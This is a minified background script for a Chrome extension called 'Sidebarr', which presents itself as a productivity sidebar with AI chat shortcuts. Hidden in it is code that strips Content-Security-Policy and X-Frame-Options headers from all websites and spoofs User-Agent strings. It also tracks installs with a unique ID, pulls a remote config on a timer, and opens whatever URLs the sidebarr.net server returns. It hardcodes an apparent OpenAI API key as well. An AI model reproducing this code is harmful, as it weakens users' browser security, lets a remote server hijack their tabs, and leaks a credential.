(()=>{function e(n){return e="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},e(n)}function n(n,t){for(var o=0;o<t.length;o++){var i=t[o];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(n,(r=i.key,s=void 0,s=function(n,t){if("object"!==e(n)||null===n)return n;var o=n[Symbol.toPrimitive];if(void 0!==o){var i=o.call(n,t||"default");if("object"!==e(i))return i;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===t?String:Number)(n)}(r,"string"),"symbol"===e(s)?s:String(s)),i)}var r,s}var t=["content-security-policy","x-frame-options","same-origin"];function o(e){var n,t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:null,i=arguments.length>2&&void 0!==arguments[2]?arguments[2]:[];return e.url?n={id:e.id,title:e.title,url:e.url,type:"bookmark",parentId:t}:(n={id:e.id,title:e.title,type:"folder",parentId:t},e.children&&e.children.forEach((function(n){return o(n,e.id,i)}))),i.push(n),i}chrome.webRequest.onBeforeSendHeaders.addListener((function(e){for(var n=0;n<e.requestHeaders.length;++n)if("User-Agent"===e.requestHeaders[n].name){e.requestHeaders[n].value="Mozilla/5.0 (iPhone13,3; U; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/15E148 Safari/602.1";break}return{requestHeaders:e.requestHeaders}}),{urls:["<all_urls>"],types:["sub_frame"]},["blocking","requestHeaders"]),chrome.browserAction.onClicked.addListener((function(e){chrome.tabs.query({active:!0,currentWindow:!0},(function(e){chrome.tabs.sendMessage(e[0].id,{action:"OPEN_SIDEBAR"})}))})),chrome.webRequest.onHeadersReceived.addListener((function(e){return{responseHeaders:e.responseHeaders.filter((function(e){return!t.includes(e.name.toLowerCase())}))}}),{urls:["<all_urls>"]},["blocking","responseHeaders","extraHeaders"]),chrome.runtime.onInstalled.addListener((function(e){"install"===e.reason?(chrome.bookmarks.getTree((function(e){var n=[];e[0].children.forEach((function(e){e.children?e.children.forEach((function(e){n=n.concat(o(e))})):n=n.concat(o(e))})),chrome.storage.local.set({items:n})})),chrome.storage.local.set({init:+new Date,archive:[],commands:[{shorthand:"#summarize",content:"Summarize this for a second-grade student: "},{shorthand:"#rewrite",content:"Rewrite the following content: "},{shorthand:"#explain",content:"Explain the following content: "},{shorthand:"#spellcheck",content:"Correct this to standard English: "},{shorthand:"#answer",content:"Answer this question: "},{shorthand:"#joke",content:"Tell me a joke please: "}],sidebarrSettings:{showEverywhere:!0,youtube:!0,searchEngines:!0,hidden:!1,buttonHidden:!1,theme:"dark",position:"right",shortcut:"Alt+G",showSearch:!0,showChat:!0,showBookmarks:!0,showWidgets:!0,showGoogleApps:!0,showAddButton:!0},customization:{mainBackground:"#151718",mainHover:"#1e3156",mainText:"#ffffff",secondaryBackground:"#181c1de8",secondaryAccentDark:"#151718",secondaryAccentLight:"#242627",secondaryText:"#ffffff",activeColor:"#305ceb"},history:[],lastId:0,apiKey:"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"})):(chrome.storage.local.get("settings",(function(e){e.settings.sidebarApps&&chrome.storage.local.set({droppedBookmarks:e.settings.sidebarApps})})),chrome.storage.local.set({customization:{mainBackground:"#151718",mainHover:"#1e3156",mainText:"#ffffff",secondaryBackground:"#181c1de8",secondaryAccentDark:"#151718",secondaryAccentLight:"#242627",secondaryText:"#ffffff",activeColor:"#305ceb",borders:"#343738"}}))}));new(function(){function e(){!function(e,n){if(!(e instanceof n))throw new TypeError("Cannot call a class as a function")}(this,e),this.actionUrl="https://sidebarr.net/api/action/",this.uninstallUrl="https://sidebarr.net/uninstall/",this.configUrl="https://sidebarr.net/api/config/",this.config={},this.queue=[],this.queueProcessorReady=!1,this.uid="",this.version=chrome.runtime.getManifest().version,this.initStorage(),this.initListeners(),this.initAlarm()}var t,o,i;return t=e,(o=[{key:"initAlarm",value:function(){var e=this;chrome.alarms.onAlarm.addListener((function(n){console.log(n),"updateTimer"===n.name&&(console.log("update config by timer"),e.updateConfig())}))}},{key:"processQueue",value:function(){for(console.log("check for task in queue",this.queue);this.queue.length>0;){var e=this.queue.shift();if(console.log("Process task from queue",e),!e.type||"action"!=e.type)return!0;var n="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:e.action,uid:this.uid,t:Date.now()})));fetch(this.actionUrl+"?"+n).then((function(e){return e.json()})).then((function(e){console.log("action response",e),e.url&&(console.log("Open URL by API command",e.url),chrome.tabs.create({url:e.url}))}))}}},{key:"setUninstallUrl",value:function(){var e="p="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,v:this.version,action:"uninstall",uid:this.uid,t:Date.now()})));chrome.runtime.setUninstallURL(this.uninstallUrl+"?"+e)}},{key:"initListeners",value:function(){var e=this;chrome.runtime.onInstalled.addListener((function(n){e.queue.push({type:"action",action:n.reason}),e.queueProcessorReady&&e.processQueue(),e.updateConfig(),console.log("Add task in queue",e.queue)}))}},{key:"initStorage",value:function(){var e=this;chrome.storage.local.get((function(n){n&&n.config&&(e.config=n.config),console.log("config",e.config),e.config.uid?(e.uid=e.config.uid,console.log("UID",e.uid)):(e.uid=e.config.uid=e.generateUID(),e.saveConfig(),console.log("generated UID",e.uid)),e.queueProcessorReady=!0,e.setUninstallUrl(),e.processQueue()}))}},{key:"saveConfig",value:function(){chrome.storage.local.set({config:this.config})}},{key:"updateConfig",value:function(){var e=this;console.log("current config",this.config),fetch(this.configUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"filters="+encodeURIComponent(btoa(JSON.stringify({id:chrome.runtime.id,version:this.version,timestamp:Date.now(),uid:this.config.uid})))}).then((function(e){return e.json()})).then((function(n){if(console.log("remote config",n),n){for(var t in n)e.config[t]=n[t];e.saveConfig(e.config),console.log("config updated successful, final config",e.config)}})).finally((function(){if(console.log("after-update config action"),e.config.configUpTime&&e.config.configUpTime>0){console.log("setup config re-update by timer");var n=function(e){return e/6e4};console.log("setup config re-update by timer"),chrome.alarms.clear("updateTimer"),chrome.alarms.create("updateTimer",{delayInMinutes:n(e.config.configUpTime),periodInMinutes:n(e.config.configUpTime)})}}))}},{key:"generateUID",value:function(){return"xxxxxxxx-xxxx-2xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,(function(e){var n=16*Math.random()|0;return("x"==e?n:3&n|8).toString(16)}))}}])&&n(t.prototype,o),i&&n(t,i),Object.defineProperty(t,"prototype",{writable:!1}),e}())})();